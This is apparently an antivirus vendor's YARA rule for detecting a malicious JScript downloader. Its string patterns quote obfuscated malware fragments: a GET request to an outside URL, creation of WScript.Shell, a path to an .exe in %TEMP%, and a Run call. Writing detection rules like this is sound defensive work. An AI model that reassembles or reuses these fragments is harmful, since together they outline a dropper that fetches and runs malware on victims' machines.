rule sig_20160401_9f5bf146b2191ff65e4710abd8162622 {
  meta:
    description = "datamaliciousorder - file 20160401_9f5bf146b2191ff65e4710abd8162622.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "6917182fe00693aecae3d66f6c82e515799dce86f04c57f54b434dc24baf4107"

  strings:
    $s1  = "UaeJsp[EegHj](\"G\" + \"ET\", \"http://langeparis.com.au/s0powa\", false);" fullword ascii
    $s2  = "var SidDmg = function XoTj() {return WScript[PxzQue](\"WScript\"+\".Shell\");}(), DclLir = 11;" fullword ascii
    $s3  = "function JujHfb(JnKcn, VclSyc){NwuDt = NwuDt * 1; return JnKcn - VclSyc;};" fullword ascii
    $s4  = "if (UaeJsp[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function FwfZkq() {return SidDmg[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"1Ks0UvPT.ex\" + \"e\";};" fullword ascii
    $s6  = "function RqgUr(){return PxAea + \"\";};" fullword ascii
    $s7  = "function ZtJdv() {return ((VrVa == true) && (VrVa == IeAdv)) ? 1 : NwuDt;};" fullword ascii
    $s8  = "function XhAn()" fullword ascii
    $s9  = "function NinXfp(IqnQap){SidDmg[\"R\"+\"un\"](IqnQap, NwuDt, NwuDt);};" fullword ascii
    $s10 = "function PhCw(){return 23;};" fullword ascii
    $s11 = "IeAdv = true; " fullword ascii
    $s12 = "function WlaXkd(){return PxzQue;};" fullword ascii
    $s13 = "return JujHfb(VmwId, RaKlh);" fullword ascii
    $s14 = "var OmvNv = new this[\"Date\"]();" fullword ascii
    $s15 = "function GxsFk(HkNar) {var WpSs = (1, 2, 3, 4, 5, HkNar); return WpSs;};" fullword ascii
    $s16 = "var IeAdv = false;" fullword ascii
    $s17 = "var GbZs = false;" fullword ascii
    $s18 = "VrVa = true; " fullword ascii
    $s19 = "var VrVa = false;" fullword ascii
    $s20 = "}while (DgLrq);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}